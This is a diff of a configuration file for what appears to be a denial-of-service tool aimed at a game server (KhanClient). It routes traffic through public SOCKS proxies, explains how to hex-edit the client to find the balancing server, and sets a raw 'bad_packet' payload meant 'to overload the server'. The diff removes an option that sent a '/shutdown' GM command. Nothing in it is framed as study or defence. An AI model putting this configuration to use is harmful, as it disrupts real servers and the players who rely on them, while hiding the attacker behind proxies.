@@ -3,9 +3,13 @@
 use_client_version : false
 
 # Leave empty if you won't use a proxy
-# Set to a SOCKS5 proxy if you want to use a proxy.
+# Set to a SOCKS4/5 proxy if you want to use a proxy.
 # http://www.gatherproxy.com/sockslist/country/?c=Thailand
-proxy : 61.7.228.51:1080
+# https://freevpn.ninja/free-proxy/country/th
+proxy : 180.183.105.7:1080
+# Set to 4 for SOCKS4
+# Set to 5 for SOCKS5
+proxy_version : 5
 
 # This is the ip:port of the balancing server NOT THE GATE.
 # To get the balancing ip:port open the KhanClient.exe with a hex editor and look for the domain/ip.
@@ -24,16 +28,8 @@ game_data_version    : 515
 # Attack wait time. (seconds)
 wait : 5
 
-# attack type 
-# 0 = bad packet
-# 1 = gm command
-attack_mode : 0
-
 # This will be the packet/payload to overload the server with
 bad_packet : 05 00 00 00 00 00 00 00 00
-
-# this will be the gm command to be sent to the server
-gm_command : /shutdown
 
 # for dev
 # env GOOS=windows GOARCH=386 go build -i -o khxn32.exe main.go
